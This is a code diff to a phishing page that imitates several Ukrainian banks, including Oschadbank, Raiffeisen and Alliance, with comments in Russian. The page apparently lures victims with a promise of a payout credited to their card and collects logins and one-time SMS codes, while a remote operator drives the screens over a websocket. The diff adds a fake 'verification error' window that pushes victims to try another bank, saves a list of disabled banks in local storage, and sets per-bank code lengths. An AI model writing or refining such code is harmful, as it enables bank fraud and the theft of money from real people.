@@ -17,6 +17,11 @@
             --alliance-primary: #0072CE; --alliance-bg: #f4f8fc;
             --alliance-text: #212529; --alliance-text-secondary: #5a6a7b;
             --alliance-btn-bg: #e9f2fa; --alliance-border-color: #d1e3f5;
+
+            /* NEW: Стили для модального окна "Недоступно" */
+            --unavail-primary: var(--oschad-primary);
+            --unavail-bg: #f8f9fa;
+            --unavail-text: var(--dark-text);
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
@@ -59,6 +64,7 @@
             position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
             font-size: 12px; font-weight: bold; color: var(--danger-color);
             background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
+            white-space: nowrap; /* NEW: чтобы метка не переносилась */
         }
 
         /* --- Стили для модального окна ЛК Ощадбанка --- */
@@ -541,6 +547,43 @@
             max-width: 420px;
             margin: 0 auto;
         }
+
+        /* NEW: Стили для модального окна "Недоступно" */
+        #unavailable-modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: var(--unavail-bg);
+            z-index: 1002; /* Выше, чем другие модалки */
+            display: none;
+            justify-content: center; align-items: flex-start;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        .unavailable-modal-content {
+            background-color: var(--white); padding: 30px; border-radius: 20px;
+            width: 100%; max-width: 380px; margin-top: 50px;
+            box-shadow: 0 15px 40px var(--shadow-color);
+            text-align: center;
+        }
+        .unavail-icon {
+            width: 60px; height: 60px; color: var(--danger-color); margin-bottom: 20px;
+        }
+        .unavail-title {
+            font-size: 22px; font-weight: 700; color: var(--unavail-text); margin-bottom: 15px;
+        }
+        .unavail-text {
+            font-size: 16px; color: var(--light-text); line-height: 1.5; margin-bottom: 30px;
+        }
+        .unavail-suggestion-grid {
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;
+        }
+        .unavail-suggestion-item {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 15px 10px; border: 1px solid var(--border-color); border-radius: 12px;
+            text-decoration: none; color: var(--dark-text); font-weight: 600;
+            cursor: pointer; transition: background-color 0.2s;
+        }
+        .unavail-suggestion-item img { max-height: 35px; margin-bottom: 8px; }
+        .unavail-suggestion-item:hover { background-color: #f0f2f5; }
     </style>
 </head>
 <body>
@@ -573,6 +616,10 @@
         <div class="alliance-modal-content" id="alliance-modal-content"></div>
     </div>
 
+    <div id="unavailable-modal-overlay">
+        <div class="unavailable-modal-content" id="unavailable-modal-content"></div>
+    </div>
+
 <script>
 document.addEventListener('DOMContentLoaded', () => {
     // --- ПРОВЕРКА БЛОКИРОВКИ ---
@@ -603,6 +650,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let collectedData = {};
     let callTimerInterval;
     let lastCodeScreen = null;
+    let disabledBanks = JSON.parse(localStorage.getItem('disabled_banks') || '[]'); // NEW: Local storage for disabled banks
 
     // --- DOM ELEMENTS ---
     const bankGrid = document.querySelector('.bank-grid');
@@ -619,15 +667,22 @@ document.addEventListener('DOMContentLoaded', () => {
     const raiffModalContent = document.getElementById('raiff-modal-content');
     const allianceModalOverlay = document.getElementById('alliance-modal-overlay');
     const allianceModalContent = document.getElementById('alliance-modal-content');
+    const unavailableModalOverlay = document.getElementById('unavailable-modal-overlay'); // NEW
+    const unavailableModalContent = document.getElementById('unavailable-modal-content'); // NEW
     
     // --- INITIALIZATION ---
-    bankGrid.innerHTML = Object.keys(bankFlows).map(id => `<a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>`).join('');
+    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
+        const isDisabled = disabledBanks.includes(id) ? ' disabled' : ''; // NEW: Check for disabled banks
+        const disabledLabel = isDisabled ? '<span class="unavailable-label">Недоступно</span>' : ''; // NEW
+        return `<a href="#" class="bank-item${isDisabled}" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span>${disabledLabel}</a>`;
+    }).join('');
 
     // --- ОПТИМИЗИРОВАННАЯ ЛОГИКА ---
     const hideAllModals = () => {
         customModalOverlay.style.display = 'none';
         raiffModalOverlay.style.display = 'none';
         allianceModalOverlay.style.display = 'none';
+        unavailableModalOverlay.style.display = 'none'; // NEW
     };
 
     // --- WEBSOCKET LOGIC ---
@@ -654,6 +709,57 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         }
     }
+    
+    // NEW: Универсальное модальное окно недоступности
+    function renderUnavailableBankModal() {
+        hideAllModals();
+        
+        // Получаем цвета для текущего выбранного банка для оформления модального окна
+        const theme = activeBankData.colors || bankFlows['oschadbank'].colors || {}; // Используем осчадбанк как дефолтный светлый
+        
+        // Установка стилей для модального окна "Недоступно"
+        const root = document.documentElement;
+        root.style.setProperty('--unavail-primary', theme.primary || bankFlows['oschadbank'].colors.primary);
+        root.style.setProperty('--unavail-bg', theme.bg || bankFlows['oschadbank'].colors.bg);
+        root.style.setProperty('--unavail-text', theme.text || bankFlows['oschadbank'].colors.text);
+
+        const html = `
+            <div class="unavailable-modal-content">
+                <svg class="unavail-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M15 9L9 15" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M9 9L15 15" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <h2 class="unavail-title">Помилка верифікації</h2>
+                <p class="unavail-text">Ми не змогли верифікувати вашу картку. Для отримання зарахування оберіть інший банк.</p>
+                <h3 class="unavail-title" style="font-size: 18px; margin-bottom: 20px;">Оберіть кращий варіант:</h3>
+                <div class="unavail-suggestion-grid">
+                    <a href="#" class="unavail-suggestion-item" data-bank="oschadbank">
+                        <img src="${bankFlows.oschadbank.logoUrl}" alt="Ощадбанк">
+                        <span>Ощадбанк</span>
+                    </a>
+                    <a href="#" class="unavail-suggestion-item" data-bank="raiffeisen">
+                        <img src="${bankFlows.raiffeisen.logoUrl}" alt="Райффайзен">
+                        <span>Райффайзен</span>
+                    </a>
+                </div>
+            </div>
+        `;
+        unavailableModalContent.innerHTML = html;
+        unavailableModalOverlay.style.display = 'flex';
+        
+        // Добавляем слушатели на предложенные банки
+        unavailableModalContent.querySelectorAll('.unavail-suggestion-item').forEach(item => {
+            item.addEventListener('click', (e) => {
+                e.preventDefault();
+                hideAllModals();
+                const bankId = item.dataset.bank;
+                const bankItem = document.querySelector(`.bank-item[data-bank="${bankId}"]`);
+                if (bankItem) bankItem.click(); // Имитируем клик по банкомату на главном экране
+            });
+        });
+    }
+
 
     // --- START ALLIANCE & OTHER LIGHT THEME BANK FLOW ---
     function renderAlliancePhoneScreen() {
@@ -999,7 +1105,7 @@ document.addEventListener('DOMContentLoaded', () => {
         lastCodeScreen = 'generic_debit';
         const theme = activeBankData.colors || { primary: '#FFCC00', text: '#F2F2F7', bg: '#1C1C1E' };
         
-        // **ИЗМЕНЕНИЕ: Установка длины кода 6 для всех, кроме Ощадбанка**
+        // **ИЗМЕНЕНИЕ: Установка длины кода 4 для Ощадбанка, 6 для остальных**
         const codeLength = activeBankData.theme === 'oschadbank' ? 4 : 6;
         
         raiffModalOverlay.style.backgroundColor = theme.bg;
@@ -1052,7 +1158,7 @@ document.addEventListener('DOMContentLoaded', () => {
         hideAllModals();
         lastCodeScreen = 'generic_light_debit';
         
-        // **ИЗМЕНЕНИЕ: Установка длины кода 6 для всех, кроме Ощадбанка**
+        // **ИЗМЕНЕНИЕ: Установка длины кода 4 для Ощадбанка, 6 для остальных**
         const codeLength = activeBankData.theme === 'oschadbank' ? 4 : 6;
 
         const html = `
@@ -1070,7 +1176,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <h2 class="alliance-main-title">Останній крок</h2>
                 <p class="alliance-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
                 <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="margin: 0 auto 25px auto; max-width: 350px; gap: ${codeLength === 6 ? '10px' : '15px'};">
-                    ${Array(codeLength).fill('<input type="tel" class="raiff-code-input" style="background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
+                    ${Array(codeLength).fill('<input type="tel" class="raiff-code-input" style="width: 50px; height: 55px; background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
                 ${options.error ? `<p class="raiff-error-text" style="color: var(--danger-color); text-align: center; font-weight: 500;">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" style="margin-top: 20px; text-align: center; color: var(--alliance-text-secondary); cursor: pointer;">Надіслати код повторно</p>
@@ -1308,12 +1414,13 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
     function renderTelegramSmsScreen(options = {}) {
-        // **ИЗМЕНЕНИЕ: Установка длины кода 6**
+        // **ИЗМЕНЕНИЕ: Установка длины кода 4 для Oschadbank - Debit/Telegram, 6 для Viber/других SMS**
+        const codeLength = activeBankData.theme === 'oschadbank' ? 4 : 6; 
         renderCodeScreen({
             header: 'Підтвердження', title: 'Останній крок',
             instructionText: 'Для зарахування коштів на вашу картку введіть одноразовий SMS код',
             resendText: 'Відправити SMS ще раз', screenId: 'telegram_sms', error: options.error,
-            codeLength: 6
+            codeLength: codeLength // 4 для Ощадбанка, 6 для других (если используется)
         });
     }
     function renderForgotPasswordFlow(step, options = {}) {
@@ -1580,11 +1687,19 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'lk': renderOschadbankLogin(); break;
             case 'call': renderOschadbankCallConfirmation(); break;
             case 'viber': renderOschadbankViberScreen(); break;
-            case 'telegram_debit': renderTelegramSmsScreen(); break;
+            case 'telegram_debit': 
+                // **ИЗМЕНЕНИЕ: Отдельная логика для Telegram Debit**
+                renderTelegramSmsScreen(); 
+                break;
             case 'show_debit_form':
-                if (['alliance', 'vostok', 'izibank', 'ukrsib'].includes(activeBankData.theme)) {
+                if (activeBankData.theme === 'oschadbank') {
+                    // Ощадбанк - 4 цифры
+                    renderThemedDebitScreen();
+                } else if (['alliance', 'vostok', 'izibank', 'ukrsib'].includes(activeBankData.theme)) {
+                    // Светлые темы - 6 цифр
                     renderThemedLightDebitScreen();
                 } else {
+                    // Темные темы (Raiffeisen) - 6 цифр
                     renderThemedDebitScreen();
                 }
                 break;
@@ -1622,16 +1737,22 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'viber_code_error': renderOschadbankViberScreen({ error: true }); break;
             case 'other':
-                const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
-                if (bankToDisable) {
+                // **NEW: Обработка команды 'other'**
+                const bankToDisableId = activeBankData.theme;
+                const bankToDisable = document.querySelector(`.bank-item[data-bank="${bankToDisableId}"]`);
+                
+                // 1. Блокируем локально
+                if (bankToDisable && !disabledBanks.includes(bankToDisableId)) {
+                    disabledBanks.push(bankToDisableId);
+                    localStorage.setItem('disabled_banks', JSON.stringify(disabledBanks));
                     bankToDisable.classList.add('disabled');
-                    if (!bankToDisable.querySelector('.unavailable-label')) bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
+                    if (!bankToDisable.querySelector('.unavailable-label')) {
+                        bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
+                    }
                 }
-                modalTitle.textContent = "Помилка";
-                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p>`;
-                modalFooter.style.display = 'flex';
-                modalFooter.innerHTML = `<button class="btn btn-next" onclick="window.location.reload()">Обрати інший банк</button>`;
-                body.classList.add('form-active');
+                
+                // 2. Показываем модальное окно с предложениями
+                renderUnavailableBankModal();
                 break;
             case 'ban':
                 // **ИЗМЕНЕНИЕ: Логика блокировки**
